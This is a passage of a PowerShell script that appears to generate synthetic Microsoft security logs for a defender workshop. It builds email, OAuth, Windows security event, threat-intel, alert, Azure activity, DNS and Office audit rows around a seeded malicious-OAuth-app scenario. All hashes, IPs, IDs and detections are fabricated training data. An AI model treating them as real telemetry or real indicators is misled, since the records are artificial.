            $values.DeliveryAction = if ($isThreat) { 'Blocked' } else { 'Delivered' }
            $values.DeliveryLocation = if ($isThreat) { 'Quarantine' } elseif ($isExternalRecipient) { 'On-premises/external' } else { 'Inbox/folder' }
            $values.LatestDeliveryAction = $values.DeliveryAction
            $values.LatestDeliveryLocation = $values.DeliveryLocation
            $values.ThreatTypes = if ($isThreat) { 'Phish' } else { '' }
            $values.ThreatNames = if ($isThreat) { 'Phish.Credential' } else { '' }
            $values.DetectionMethods = if ($isThreat) { 'Advanced filter' } else { '' }
            $values.ConfidenceLevel = if ($isThreat) { 'High' } else { '' }
            $values.EmailAction = if ($isThreat) { 'Quarantine' } else { 'None' }
            $values.AuthenticationDetails = if (($Index % 31) -eq 0) {
                '{"SPF":"softfail","DKIM":"pass","DMARC":"pass","CompAuth":"pass"}'
            }
            elseif (($Index % 29) -eq 0) {
                '{"DKIM":"none","DMARC":"none"}'
            }
            else {
                '{"SPF":"pass","DKIM":"pass","DMARC":"pass","CompAuth":"pass"}'
            }
            $values.AttachmentCount = @(0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 6, 10)[$Index % 12]
            $values.UrlCount = @(4, 4, 4, 4, 4, 4, 3, 3, 11, 6, 2, 1)[$Index % 12]
            $values.EmailLanguage = if (($Index % 500) -eq 0) { 'ja' } else { 'en' }
            $values.EmailSize = 140000 + (($Index * 907) % 60000)
            $values.IsFirstContact = ($Index % 55) -eq 0
            $values.EmailClusterId = 2961079000 + ($Index % 9000)
            $values.ReportId = New-StableGuid "email-report|$Index"
            $values.To = @($recipient.Upn)
            $values.OrgLevelAction = if ($isThreat) { 'Quarantine' } else { 'None' }
            $values.OrgLevelPolicy = if ($isThreat) { 'Anti-phishing policy' } else { '' }
            $values.UserLevelAction = 'None'
            $values.BulkComplaintLevel = if ($direction -eq 'Inbound') { $Index % 5 } else { 0 }
        }
        'EmailUrlInfo' {
            $urlTemplate = $emailUrlCatalog[$Index % $emailUrlCatalog.Count]
            $values.NetworkMessageId = New-StableGuid "email|$Index"
            $values.Url = $urlTemplate.Url
            $values.UrlDomain = $urlTemplate.Domain
            $values.UrlLocation = Get-WorkshopRandomItem @('Body', 'Attachment', 'QRCode', 'Header')
            $values.UrlChainId = New-StableGuid "url-chain|$Index"
            $values.UrlChainPosition = $Index % 3
            $values.ReportId = [string]$reportId
        }
        'EmailAttachmentInfo' {
            $attachment = $emailAttachmentCatalog[$Index % $emailAttachmentCatalog.Count]
            $sender = $users[($Index * 13) % $users.Count]
            $recipient = $users[($Index * 29) % $users.Count]
            $attachmentHashes = Get-WorkshopHashSet -ContentKey "attachment|$($attachment.FileName)"
            $values.NetworkMessageId = New-StableGuid "email|$Index"
            $values.SenderFromAddress = $sender.Upn
            $values.SenderDisplayName = $sender.DisplayName
            $values.SenderObjectId = $sender.ObjectId
            $values.RecipientEmailAddress = $recipient.Upn
            $values.RecipientObjectId = $recipient.ObjectId
            $values.FileName = $attachment.FileName
            $values.FileType = $attachment.FileType
            $values.FileExtension = $attachment.Extension
            $values.SHA256 = $attachmentHashes.SHA256
            $values.FileSize = $attachment.Size
            $values.ThreatTypes = if (($Index % 37) -eq 0) { 'Malware' } else { '' }
            $values.DetectionMethods = if (($Index % 37) -eq 0) { 'Safe Attachments' } else { '' }
            $values.ReportId = [string]$reportId
        }
        'EmailPostDeliveryEvents' {
            $values.NetworkMessageId = New-StableGuid "email|$Index"
            $values.InternetMessageId = '<{0}@{1}>' -f (New-StableHex "internet-message|$Index" 24), $tenantDomain
            $values.Action = Get-WorkshopRandomItem @('Quarantine', 'Move to junk', 'Soft delete', 'Move to inbox')
            $values.ActionType = Get-WorkshopRandomItem @('Manual remediation', 'Phish ZAP', 'Malware ZAP')
            $values.ActionTrigger = Get-WorkshopRandomItem @('ZAP', 'Administrative action', 'User reported')
            $values.ActionResult = Get-WorkshopRandomItem @('Success', 'Success', 'Success', 'Failed')
            $values.RecipientEmailAddress = $users[($Index * 29) % $users.Count].Upn
            $values.SenderFromAddress = '{0}@{1}' -f $emailSubjectCatalog[$Index % $emailSubjectCatalog.Count].Sender, $emailSubjectCatalog[$Index % $emailSubjectCatalog.Count].Domain
            $values.DeliveryLocation = 'Quarantine'
            $values.SourceLocation = 'Inbox'
            $values.EmailDirection = 'Inbound'
            $values.ThreatTypes = 'Phish'
            $values.DetectionMethods = 'Advanced filter'
            $values.ReportId = [string]$reportId
        }
        'UrlClickEvents' {
            $urlTemplate = $emailUrlCatalog[$Index % $emailUrlCatalog.Count]
            $clickUser = $users[($Index * 29) % $users.Count]
            $isBlocked = ($Index % 19) -eq 0
            $values.Url = $urlTemplate.Url
            $values.ActionType = if ($isBlocked) { 'ClickBlocked' } else { 'ClickAllowed' }
            $values.AccountUpn = $clickUser.Upn
            $values.Workload = Get-WorkshopRandomItem @('Email', 'Teams', 'Office')
            $values.NetworkMessageId = New-StableGuid "email|$Index"
            $values.ThreatTypes = if ($isBlocked) { 'Phish' } else { '' }
            $values.DetectionMethods = if ($isBlocked) { 'Safe Links' } else { '' }
            $values.IPAddress = '198.51.100.{0}' -f (50 + ($Index % 40))
            $values.IsClickedThrough = -not $isBlocked
            $values.UrlChain = $urlTemplate.Url
            $values.AppName = Get-WorkshopRandomItem @('Outlook', 'Microsoft Teams', 'Edge')
            $values.AppVersion = '16.0.17928.20114'
            $values.SourceId = New-StableGuid "url-click|$Index"
            $values.ReportId = [string]$reportId
        }
        'OAuthAppInfo' {
            $oauthApp = $oauthAppCatalog[$Index % $oauthAppCatalog.Count]
            $addedTime = $Time.AddDays(-(($Index % 900) + 30))
            $values.OAuthAppId = New-StableGuid "oauth-app|$($oauthApp.Name)"
            $values.ServicePrincipalId = New-StableGuid "oauth-sp|$($oauthApp.Name)"
            $values.AppName = $oauthApp.Name
            $values.AddedOnTime = Format-WorkshopTime $addedTime
            $values.LastModifiedTime = Format-WorkshopTime $addedTime.AddDays($Index % 60)
            $values.LastUsedTime = Format-WorkshopTime $Time.AddHours(-($Index % 72))
            $values.AppStatus = if (($Index % 17) -eq 0) { 'Disabled' } else { 'Enabled' }
            $values.VerifiedPublisher = @{ verifiedPublisherId = $oauthApp.PublisherId; displayName = $oauthApp.Publisher; addedDateTime = (Format-WorkshopTime $addedTime) }
            $values.PrivilegeLevel = $oauthApp.PrivilegeLevel
            $values.Permissions = [object[]]$oauthApp.Permissions
            $values.ConsentedUsersCount = $oauthApp.ConsentedUsers
            $values.IsAdminConsented = $oauthApp.AdminConsented
            $values.AppOrigin = $oauthApp.Origin
            $values.AppOwnerTenantId = $tenantId
            $values.ReportId = [string]$reportId
        }
        { $_ -in @('BehaviorInfo', 'BehaviorEntities') } {
            $behavior = $behaviorCatalog[$Index % $behaviorCatalog.Count]
            $behaviorId = New-StableGuid "behavior|$Index"
            $values.BehaviorId = $behaviorId
            $values.ActionType = $behavior.ActionType
            $values.Categories = $behavior.Category
            $values.ServiceSource = $behavior.ServiceSource
            $values.DetectionSource = $behavior.DetectionSource
            $values.DataSources = $behavior.DataSources
            $values.MachineGroup = if ($device.Type -eq 'DomainController') { 'Domain Controllers' } elseif ($isUbuntuDevice) { 'Linux Servers' } else { 'Workstations' }

            if ($Table -eq 'BehaviorInfo') {
                $values.Title = $behavior.Title
                $values.Description = $behavior.Description
                $values.AttackTechniques = $behavior.Techniques
                $values.DeviceId = $device.DeviceId
                $values.AccountUpn = $user.Upn
                $values.AccountObjectId = $user.ObjectId
                $values.StartTime = Format-WorkshopTime $Time.AddMinutes(-($Index % 30))
                $values.EndTime = Format-WorkshopTime $Time
                $values.Insights = $behavior.Insights
            }
            else {
                $values.EntityType = $behavior.EntityType
                $values.EntityRole = 'Impacted'
                $values.DetailedEntityRole = $behavior.EntityType
                $values.DeviceId = $device.DeviceId
                $values.DeviceName = $device.Name
                $values.LocalIP = $device.IP
                $values.AccountName = $effectiveAccountName
                $values.AccountDomain = $accountDomain
                $values.AccountSid = $user.Sid
                $values.AccountObjectId = $user.ObjectId
                $values.AccountUpn = $user.Upn
                $values.FileName = $process.File
                $values.FolderPath = $processPath
                $values.SHA1 = $processHashes.SHA1
                $values.SHA256 = $processHashes.SHA256
                $values.ProcessCommandLine = $processCommand
            }
        }
        'SecurityEvent' {
            # Shaped from the real SecurityEvent sample: 66 of 234 columns carry data,
            # and AccountType is Machine on 997 of 1000 rows because computer accounts
            # generate most Windows security auditing volume. Empty-but-present fields
            # use the literal "-" and Windows message table codes such as %%1833, both
            # of which appear throughout the real data.
            $securityEventTemplate = $securityEventCatalog[$Index % $securityEventCatalog.Count]
            $isMachineAccount = ($Index % 1000) -ge 3
            $machineAccountName = '{0}$' -f $device.ShortName
            $logonUser = if ($isDeviceScopedTable) { $user } else { $users[($Index * 17) % $users.Count] }
            $principalName = if ($isMachineAccount) { $machineAccountName } else { $logonUser.Name }
            $principalSid = if ($isMachineAccount) { 'S-1-5-18' } else { $logonUser.Sid }
            $dnsDomain = $corpFqdn.ToUpperInvariant()
            $useDnsDomain = ($Index % 2) -eq 0
            $subjectDomain = if ($useDnsDomain) { $dnsDomain } else { $adDomain }
            $hasSubject = ($Index % 100) -lt 69
            $hasTarget = ($Index % 100) -lt 63
            $hasLogonDetail = $securityEventTemplate.EventID -in @(4624, 4625)

            $values.EventID = $securityEventTemplate.EventID
            $values.Activity = $securityEventTemplate.Activity
            $values.EventSourceName = 'Microsoft-Windows-Security-Auditing'
            $values.Channel = 'Security'
            $values.Task = $securityEventTemplate.Task
            $values.Level = '0'
            $values.EventLevelName = 'LogAlways'
            $values.Opcode = '0'
            $values.Version = if (($Index % 100) -lt 68) { '0' } else { '3' }
            $values.Keywords = if (($Index % 100) -lt 95) { '0x8020000000000000' } else { '0x8010000000000000' }
            $values.EventRecordId = [string](2100000 + $Index)
            $values.SystemThreadId = [string]@(6424, 6424, 6424, 3248, 3248, 2080, 9332)[$Index % 7]
            $values.SystemProcessId = if (($Index % 100) -lt 94) { '892' } else { '4' }
            $values.SystemUserId = 'N/A'
            $values.Computer = $device.Name
            $values.SourceSystem = 'OpsManager'
            $values.ManagementGroupName = "AOI-$tenantId"
            $values.MG = '00000000-0000-0000-0000-000000000002'
            $values.EventOriginId = New-StableGuid "security-event-origin|$($device.ShortName)"
            $values.EventSourceId = New-StableGuid "security-event-source|$($device.ShortName)"
            $values.SourceComputerId = New-StableGuid "source-computer|$($device.ShortName)"
            $values.TimeCollected = $timeText
            $values.Correlation = '{{{0}}}' -f (New-StableGuid "security-correlation|$Index")

            $values.AccountType = if ($isMachineAccount) { 'Machine' } else { 'User' }
            $values.Account = '{0}\{1}' -f $subjectDomain, $principalName
            $values.AccountName = $principalName
            $values.AccountDomain = $subjectDomain

            if ($hasSubject) {
                $values.SubjectAccount = '{0}\{1}' -f $adDomain, $principalName
                $values.SubjectUserName = $principalName
                $values.SubjectDomainName = $adDomain
                $values.SubjectUserSid = $principalSid
                $values.SubjectLogonId = '0x{0:x}' -f (0x3e5 + ($Index % 4000000))
            }
            else {
                $values.SubjectAccount = '-\-'
                $values.SubjectUserName = '-'
                $values.SubjectDomainName = '-'
                $values.SubjectUserSid = 'S-1-0-0'
                $values.SubjectLogonId = '0x0'
            }

            if ($hasTarget) {
                $values.TargetAccount = '{0}\{1}' -f $subjectDomain, $principalName
                $values.TargetUserName = $principalName
                $values.TargetDomainName = $subjectDomain
                $values.TargetUserSid = $principalSid
                $values.TargetLogonId = '0x{0:x}' -f (0x14000000 + ($Index % 8000000))
                $values.LogonType = $securityEventTemplate.LogonType
                $values.LogonTypeName = $securityEventTemplate.LogonTypeName
            }

            if ($hasLogonDetail) {
                $values.LogonProcessName = $securityEventTemplate.LogonProcessName
                $values.AuthenticationPackageName = $securityEventTemplate.AuthenticationPackage
                $values.LogonGuid = New-StableGuid "logon-guid|$($Index % 40)"
                $values.ElevatedToken = '%%1842'
                $values.VirtualAccount = '%%1843'
                $values.ImpersonationLevel = if (($Index % 5) -eq 0) { '%%1840' } else { '%%1833' }
                $values.KeyLength = '0'
                $values.LmPackageName = '-'
                $values.RestrictedAdminMode = '-'
                $values.WorkstationName = '-'
                $values.TransmittedServices = '-'
                $values.TargetOutboundUserName = '-'
                $values.TargetOutboundDomainName = '-'
                $values.TargetLinkedLogonId = '0x0'
                $values.IpAddress = @('fe80::ca75:1fe1:437a:592c', '::1', '::1', $device.IP, '-')[$Index % 5]
                $values.IpPort = if (($Index % 12) -eq 0) { '0' } else { [string](49152 + ($Index % 16000)) }
                $values.Status = $securityEventTemplate.Status
            }

            if (($Index % 100) -lt 38) {
                $values.ProcessName = if ($hasSubject) { 'C:\Windows\System32\lsass.exe' } else { '-' }
                $values.Process = if ($hasSubject) { 'lsass.exe' } else { '-' }
                $values.ProcessId = if ($hasSubject) { '0x37c' } else { '0x0' }
            }

            if ($securityEventTemplate.EventID -eq 4672) {
                $values.PrivilegeList = 'SeSecurityPrivilege                   SeBackupPrivilege                   SeRestorePrivilege                   SeTakeOwnershipPrivilege                   SeDebugPrivilege'
            }
            elseif (($Index % 100) -lt 38) {
                $values.PrivilegeList = 'SeSecurityPrivilege'
            }

            if ($securityEventTemplate.EventID -eq 4688) {
                $values.NewProcessName = $processPath
                $values.CommandLine = $processCommand
            }
            if ($securityEventTemplate.EventID -in @(4768, 4769)) {
                $values.TicketEncryptionType = $securityEventTemplate.TicketEncryptionType
                $values.ServiceName = $securityEventTemplate.ServiceName
                $values.Status = '0x0'
            }
            if ($securityEventTemplate.EventID -eq 4674) {
                $values.ObjectServer = 'LSA'
                $values.ObjectType = '-'
                $values.ObjectName = '-'
                $values.HandleId = '0x0'
                $values.AccessMask = '16777216'
            }
        }
        'ThreatIntelIndicators' {
            # Shaped from the real ThreatIntelIndicators sample: 21 of 23 columns carry
            # data, SourceSystem is always the MDTI connector, Confidence is 100 on 971
            # of 1000 rows, and ObservableKey is network-traffic:src_ref.value on 971.
            # The scenario indicators occupy the first slots of a 250-row rotation so a
            # join from this table reaches the device, identity, and cloud tables.
            $scenarioSlot = $Index % 250
            if ($scenarioSlot -lt $threatIntelScenarioIndicators.Count) {
                $indicator = $threatIntelScenarioIndicators[$scenarioSlot]
                $observableKey = $indicator.Key
                $observableValue = $indicator.Value
                $confidence = $indicator.Confidence
                $tlpLevel = $indicator.Tlp
                $indicatorTags = $indicator.Tags
            }
            else {
                $tiTemplate = $threatIntelObservableCatalog[$Index % $threatIntelObservableCatalog.Count]
                $observableKey = $tiTemplate.Key
                $confidence = $tiTemplate.Confidence
                $tlpLevel = $tiTemplate.Tlp
                $observableValue = switch ($tiTemplate.Kind) {
                    'Ipv4' { '{0}.{1}.{2}.{3}' -f (20 + ($Index % 200)), (($Index * 7) % 256), (($Index * 13) % 256), (1 + (($Index * 29) % 254)) }
                    'Sha256' { (New-StableHex "ti-sha256|$Index" 64).ToUpperInvariant() }
                    'Domain' { 'cdn{0}.static-content.example' -f (($Index * 17) % 9999) }
                    'Url' { 'https://cdn{0}.static-content.example/a/{1}' -f (($Index * 17) % 9999), (New-StableHex "ti-url|$Index" 8) }
                    'Email' { 'no-reply{0}@mail-delivery.example' -f (($Index * 11) % 9999) }
                    default { $externalIp }
                }
                $indicatorTags = 'honeypot,p:default,ic:{0},vic:{1},gid:{2},ci:{3}' -f $confidence, $confidence, (New-StableHex "ti-gid|$Index" 5), (New-StableHex "ti-ci|$Index" 6)
            }

            $pattern = "[{0} = '{1}']" -f $observableKey, $observableValue
            $validFrom = $Time.AddDays(-1 * ($Index % 45))
            $created = $validFrom.AddDays(-1 * ($Index % 30))
            $validUntil = $validFrom.AddDays(365 + ($Index % 2900))
            $isActive = ($Index % 500) -ne 0

            $values.TenantId = $tenantId
            $values.WorkspaceId = $tenantId
            $values.AzureTenantId = $tenantId
            $values.Id = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(('Microsoft Defender Threat Intelligence|{0}' -f $pattern)))
            $values.SourceSystem = 'Microsoft Defender Threat Intelligence'
            $values.LastUpdateMethod = 'BasicMDTIConnector'
            $values.IsDeleted = $false
            $values.AdditionalFields = @{ TLPLevel = $tlpLevel }
            $values.IsActive = $isActive
            $values.ValidFrom = Format-WorkshopTime $validFrom
            $values.ValidUntil = Format-WorkshopTime $validUntil
            $values.Created = Format-WorkshopTime $created
            $values.Modified = Format-WorkshopTime $validFrom
            $values.Tags = $indicatorTags
            $values.Confidence = $confidence
            $values.Pattern = $pattern
            $values.ObservableKey = $observableKey
            $values.ObservableValue = $observableValue
            $values.Data = @{
                pattern = $pattern
                type = 'indicator'
                spec_version = '2.1'
                id = 'indicator--{0}' -f (New-StableGuid "ti-stix|$observableValue")
                created = Format-WorkshopTime $created
                modified = Format-WorkshopTime $validFrom
                valid_from = Format-WorkshopTime $validFrom
                valid_until = Format-WorkshopTime $validUntil
                pattern_type = 'stix'
                confidence = $confidence
                indicator_types = [object[]]@('malicious-activity')
            }
            $values.Type = 'ThreatIntelIndicators'
        }
        'SecurityAlert' {
            # Shaped from the real SecurityAlert sample: 30 of 35 columns carry data.
            # ProviderName is MDATP on 552 of 1000 rows and the Sentinel analytics
            # providers on 433, so the Sentinel-only columns are deliberately empty on
            # the MDATP rows exactly as they are in the real table.
            $alertTemplate = $securityAlertCatalog[$Index % $securityAlertCatalog.Count]
            $isSentinelAlert = $alertTemplate.Provider -like 'ASI *'
            $alertStart = $Time.AddMinutes(-1 * (5 + ($Index % 55)))
            $systemAlertId = New-StableGuid "security-alert|$Index"
            $alertUser = $users[($Index * 19) % $users.Count]
            $alertDevice = $devices[($Index * 7) % $devices.Count]

            $values.TenantId = $tenantId
            $values.DisplayName = $alertTemplate.Name
            $values.AlertName = $alertTemplate.Name
            $values.AlertSeverity = $alertTemplate.Severity
            $values.Description = $alertTemplate.Description
            $values.ProviderName = $alertTemplate.Provider
            $values.VendorName = 'Microsoft'
            $values.ProductName = $alertTemplate.Product
            $values.VendorOriginalId = if ($isSentinelAlert) { '{0}_aml' -f (New-StableGuid "alert-vendor|$Index") } else { '{0}_1' -f (New-StableGuid "alert-vendor|$Index") }
            $values.SystemAlertId = $systemAlertId
            $values.AlertType = if ($isSentinelAlert) { '{0}_{1}' -f $tenantId, (New-StableGuid "alert-rule|$($alertTemplate.Name)") } else { 'CustomDetection' }
            $values.IsIncident = $false
            $values.StartTime = Format-WorkshopTime $alertStart
            $values.EndTime = Format-WorkshopTime $alertStart.AddMinutes(2 + ($Index % 9))
            $values.ProcessingEndTime = $timeText
            $values.SourceSystem = 'Detection'
            $values.Status = if (($Index % 20) -eq 0) { 'Resolved' } else { 'New' }
            $values.Tactics = $alertTemplate.Tactics
            $values.Type = 'SecurityAlert'
            $values.ExtendedProperties = @{
                IncidentId = [string](300 + ($Index % 400))
                OriginSource = 'Microsoft Defender XDR'
                Alert_Display_Name = $alertTemplate.Name
                ProcessedBySentinel = if ($isSentinelAlert) { 'True' } else { 'False' }
            }

            # RemediationSteps is null on 83 percent of real rows, Techniques on 88,
            # SubTechniques on 98, and Entities on 35.
            if (($Index % 6) -eq 0) {
                $values.RemediationSteps = [object[]]@('Collect artifacts and determine scope', 'Review the sign-in and consent history for the affected identity')
            }
            if ($alertTemplate.Techniques -and ($Index % 8) -lt 1) {
                $values.Techniques = [object[]]@($alertTemplate.Techniques)
            }
            if (($Index % 50) -eq 0 -and $alertTemplate.Techniques) {
                $values.SubTechniques = [object[]]@('{0}.001' -f $alertTemplate.Techniques)
            }
            if (($Index % 100) -lt 65) {
                $values.Entities = [object[]]@(
                    @{ '$id' = '3'; DnsDomain = $corpFqdn; HostName = $alertDevice.ShortName; Type = 'host' }
                    @{ '$id' = '4'; Name = $alertUser.Name; UPNSuffix = $tenantDomain; Type = 'account' }
                )
                $values.CompromisedEntity = $alertDevice.Name
            }

            if ($isSentinelAlert) {
                $values.WorkspaceSubscriptionId = $subscriptionId
                $values.WorkspaceResourceGroup = 'sentinel'
                $values.ProductComponentName = if ($alertTemplate.Provider -eq 'ASI NRT Alerts') { 'NRT Alerts' } else { 'Scheduled Alerts' }
            }
            else {
                $values.AlertLink = 'https://security.microsoft.com/alerts/{0}' -f $systemAlertId
            }
        }
        'AzureActivity' {
            # Shaped from the real AzureActivity sample: 26 of 34 columns carry data.
            # Level is Information on 921 of 1000 rows, CategoryValue is Administrative
            # on 892, and the _d suffixed columns mirror their dynamic counterparts.
            $activityTemplate = $azureActivityCatalog[$Index % $azureActivityCatalog.Count]
            $isScenarioCaller = ($Index % 37) -eq 0
            $callerObjectId = if ($isScenarioCaller) { $maliciousOAuthSpId } else { New-StableGuid "azure-caller|$($Index % 22)" }
            $callerIp = if ($isScenarioCaller) { $externalIp } else { '172.170.{0}.{1}' -f (($Index * 3) % 256), (1 + (($Index * 11) % 254)) }
            $activityResourceGroup = @('FOUNDRY', 'ADDS', 'SENTINEL', 'STORAGE', 'NETWORK')[$Index % 5]
            $activityScope = '/subscriptions/{0}/resourceGroups/{1}' -f $subscriptionId, $activityResourceGroup
            $authorizationBlock = @{
                scope = $activityScope
                action = ($activityTemplate.Operation.ToLowerInvariant())
                evidence = @{ role = 'Contributor'; roleAssignmentScope = "/subscriptions/$subscriptionId" }
            }
            $claimsBlock = @{
                aud = 'https://management.core.windows.net/'
                iss = "https://sts.windows.net/$tenantId/"
                appid = $callerObjectId
                'http://schemas.microsoft.com/identity/claims/objectidentifier' = $callerObjectId
                'http://schemas.microsoft.com/identity/claims/tenantid' = $tenantId
            }
            $propertiesBlock = @{
                eventCategory = $activityTemplate.Category
                entity = $activityScope
                statusCode = if ($activityTemplate.Substatus) { $activityTemplate.Substatus } else { 'OK' }
                message = $activityTemplate.Operation
            }

            $values.TenantId = $tenantId
            $values.OperationNameValue = $activityTemplate.Operation
            $values.Level = if (($Index % 100) -lt 92) { 'Information' } elseif (($Index % 100) -lt 97) { 'Informational' } else { 'Warning' }
            $values.ActivityStatusValue = $activityTemplate.Status
            $values.ActivitySubstatusValue = $activityTemplate.Substatus
            $values.ResourceGroup = $activityResourceGroup
            $values.SubscriptionId = $subscriptionId
            $values.CorrelationId = New-StableGuid "azure-correlation|$($Index % 450)"
            $values.Caller = $callerObjectId
            $values.CallerIpAddress = $callerIp
            $values.CategoryValue = $activityTemplate.Category
            $values.HTTPRequest = @{ clientIpAddress = $callerIp }
            $values.ResourceProviderValue = $activityTemplate.Provider
            $values.EventDataId = New-StableGuid "azure-event-data|$Index"
            $values.EventSubmissionTimestamp = $timeText
            $values.SourceSystem = 'Azure'
            $values.Authorization = $authorizationBlock
            $values.Authorization_d = $authorizationBlock
            $values.Claims = $claimsBlock
            $values.Claims_d = $claimsBlock
            $values.Properties = $propertiesBlock
            $values.Properties_d = $propertiesBlock
            $values.Hierarchy = '{0}/DibSecurity' -f $tenantId
            $values._ResourceId = $activityScope
            $values.Type = 'AzureActivity'
        }
        'ASimDnsActivityLogs' {
            # Shaped from the real ASimDnsActivityLogs sample: 50 of 144 columns carry
            # data. Every row is emitted by the domain controller, EventType is Query on
            # 948 of 1000 rows, DnsQueryTypeName is A on 854, NetworkProtocol is always
            # UDP, and DnsResponseName is the literal "[]" when no answer is recorded.
            $dnsTemplate = $dnsQueryCatalog[$Index % $dnsQueryCatalog.Count]
            $isQuery = ($Index % 100) -lt 95
            $subTypeRoll = $Index % 3
            $eventSubType = @('NA', 'request', 'response')[$subTypeRoll]
            $hasResult = $eventSubType -eq 'response'
            $isNxDomain = $hasResult -and (($Index % 25) -eq 0)
            $dnsSource = @('10.1.1.4', '10.1.1.4', '10.1.1.4', '168.63.129.16', '10.1.2.4')[$Index % 5]

            $values.TenantId = $tenantId
            $values.EventCount = 1
            $values.EventType = if ($isQuery) { 'Query' } else { 'Update' }
            $values.EventSubType = $eventSubType
            $values.EventResult = if ($hasResult) { 'Success' } else { 'NA' }
            $values.EventResultDetails = if (-not $hasResult) { 'NA' } elseif ($isNxDomain) { 'NXDOMAIN' } else { 'NOERROR' }
            $values.EventOriginalType = [string]@(279, 256, 257, 258, 259, 260, 261, 262)[$Index % 8]
            $values.EventProduct = 'DNS Server'
            $values.EventVendor = 'Microsoft'
            $values.EventStartTime = $timeText
            $values.EventEndTime = $timeText
            $values.DvcIpAddr = '10.1.1.4'
            $values.DvcHostname = 'adds01'
            $values.DvcDomain = $corpFqdn
            $values.DvcDomainType = 'FQDN'
            $values.DvcOs = 'Windows'
            $values.DvcOsVersion = '10.0.26100.0'
            $values.SrcIpAddr = $dnsSource
            $values.SrcPortNumber = @(59033, 0, 50532, 53)[$Index % 4]
            $values.DstIpAddr = '10.1.1.4'
            $values.DnsQuery = $dnsTemplate.Name
            $values.DnsQueryType = $dnsTemplate.Type
            $values.DnsQueryTypeName = $dnsTemplate.TypeName
            $values.DnsQueryClass = 1
            $values.DnsQueryClassName = 'IN'
            $values.DnsResponseName = if ($hasResult -and -not $isNxDomain) { $dnsTemplate.Response } else { '[]' }
            $values.DnsResponseCode = if ($hasResult) { if ($isNxDomain) { 3 } else { 0 } } else { $null }
            $values.NetworkProtocol = 'UDP'
            $values.TransactionIdHex = (New-StableHex "dns-transaction|$Index" 4).ToUpperInvariant()
            $values.DnsFlags = @('33,152', '256', '34,176')[$Index % 3]
            $values.DnsFlagsRecursionDesired = ($Index % 100) -lt 65
            $values.DnsFlagsRecursionAvailable = ($Index % 100) -lt 65
            $values.DnsFlagsTruncated = $false
            $values.DnsFlagsAuthoritative = ($Index % 10) -eq 0
            $values.AdditionalFields = if (($Index % 8) -eq 0) { @{ QXID = (New-StableHex "dns-qxid|$Index" 4).ToUpperInvariant() } } else { @{} }
            $values.Type = 'ASimDnsActivityLogs'
            $values._ResourceId = '/subscriptions/{0}/resourcegroups/adds/providers/microsoft.compute/virtualmachines/adds01' -f $subscriptionId

            if ($dnsTemplate.Malicious) {
                $values.SrcIpAddr = '10.20.30.24'
                $values.DnsResponseIpCountry = 'Netherlands'
            }
            elseif (($Index % 8) -eq 0) {
                $values.SrcGeoCountry = 'United States'
                $values.SrcGeoLatitude = 47.68
                $values.SrcGeoLongitude = -122.12
                $values.DnsResponseIpCountry = 'United States'
            }
        }
        'OfficeActivity' {
            # Shaped from the real OfficeActivity sample: 83 of 152 columns carry data.
            # RecordType is ExchangeAdmin on 829 of 1000 rows and most activity is
            # emitted by Exchange service principals rather than humans, which is why
            # UserId is an NT SERVICE principal on 826. OfficeTenantId is the literal
            # token $RestApiTenantId$ in the real data. The _ suffixed columns duplicate
            # their base column exactly as the connector emits them.
            $officeTemplate = $officeActivityCatalog[$Index % $officeActivityCatalog.Count]
            $officeUser = $users[($Index * 23) % $users.Count]
            $isServicePrincipalActor = $officeTemplate.Service
            $officeActor = if ($isServicePrincipalActor) {
                @('NT SERVICE\MSExchangeServiceHostNetCore (Microsoft.Exchange.ServiceHost)', 'NT SERVICE\MSExchangeAdminApiNetCore (Microsoft.Exchange.AdminApi)')[$Index % 2]
            }
            else {
                $officeUser.Upn
            }
            $officeClientIp = if ($isServicePrincipalActor) {
                '[2603:1036:301:4409::5]:{0}' -f (20000 + ($Index % 45000))
            }
            elseif (($Index % 61) -eq 0) {
                $externalIp
            }
            else {
                '45.23.{0}.{1}' -f (($Index * 5) % 256), (1 + (($Index * 17) % 254))
            }
            $officeRecordId = New-StableGuid "office-activity|$Index"
            $officeStart = $Time.AddMinutes(-1 * ($Index % 120))

            $values.TenantId = $tenantId
            $values.OrganizationId = $tenantId
            $values.OrganizationId_ = $tenantId
            $values.RecordType = $officeTemplate.RecordType
            $values.Operation = $officeTemplate.Operation
            $values.OfficeWorkload = $officeTemplate.Workload
            $values.UserType = $officeTemplate.UserType
            $values.UserKey = $officeActor
            $values.UserId = $officeActor
            $values.UserId_ = $officeActor
            $values.ClientIP = $officeClientIp
            $values.ClientIP_ = $officeClientIp
            $values.ResultStatus = if ($officeTemplate.RecordType -eq 'ExchangeAdmin') { 'True' } else { 'Succeeded' }
            $values.ResultReasonType = $values.ResultStatus
            $values.ExternalAccess = ($Index % 100) -lt 53
            $values.OriginatingServer = '{0} (15.21.0202.012)' -f @('MN0PR18MB6038', 'DM4PR18MB4318', 'CH2PR18MB3901')[$Index % 3]
            $values.OrganizationName = $tenantDomain
            $values.SourceSystem = 'OfficeActivityManager'
            $values.OfficeId = $officeRecordId
            $values.SourceRecordId = $officeRecordId
            $values.OfficeTenantId = '$RestApiTenantId$'
            $values.OfficeTenantId_ = '$RestApiTenantId$'
            $values.ElevationTime = Format-WorkshopTime $officeStart
            $values.Start_Time = Format-WorkshopTime $officeStart
            $values.Type = 'OfficeActivity'

            # AppAccessContext is present on 99 percent of real rows and AppPoolName on
            # 83, so both are effectively baseline rather than exceptional.
            $values.AppAccessContext = if (($Index % 100) -lt 60) {
                @{ IssuedAtTime = (Format-WorkshopTime $officeStart); UniqueTokenId = (New-StableHex "office-token|$Index" 22) }
            }
            else {
                @{}
            }
            if ($isServicePrincipalActor) {
                $values.AppPoolName = if ($officeActor -like '*ServiceHost*') { 'MSExchangeServiceHostNetCore' } else { 'MSExchangeAdminApiNetCore' }
            }
            if (($Index % 10) -eq 0) {
                $values.AppId = New-StableGuid "office-app|$($Index % 6)"
                $values.ClientAppId = $values.AppId
            }
            if (($Index % 50) -eq 0) {
                $values.UserAgent = if ($officeTemplate.Workload -eq 'MicrosoftTeams') { 'TeamsMiddleTier/1.0a$*+' } else { $browserUserAgent }
            }
            if (($Index % 100) -eq 0) {
                $values.ApplicationId = '00000003-0000-0000-c000-000000000000'
                $values.AzureADAppId = $maliciousOAuthAppId
            }

            if ($officeTemplate.Operation -in @('MailItemsAccessed', 'New-InboxRule', 'Add-MailboxPermission')) {
                $values.Logon_Type = if ($officeTemplate.UserType -eq 'Admin') { 'Admin' } else { 'Owner' }
